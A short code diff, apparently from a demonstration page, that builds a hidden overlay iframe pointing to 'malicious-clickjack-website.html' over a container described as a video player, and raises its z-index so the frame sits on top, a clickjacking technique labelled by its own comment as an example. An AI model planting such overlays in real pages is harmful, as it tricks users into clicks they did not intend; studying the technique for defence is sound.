@@ -19,7 +19,7 @@
         // Example of a script injecting a hidden 'Like' button or Malicious Link
         const overlay = document.createElement('div');
         overlay.className = 'hidden-overlay';
-        overlay.innerHTML = `<iframe src="malicious-clickjack-website.html" style="width: 100%; height: 100%; border: none;"></iframe>`;
+        overlay.innerHTML = `<iframe src="malicious-clickjack-website.html" style="width: 100%; height: 100%; border: none; z-index: 9999;"></iframe>`;
 
         // Attach it to a legitimate container (like a video player)
         const adWrapper = document.querySelector('#wrapper');
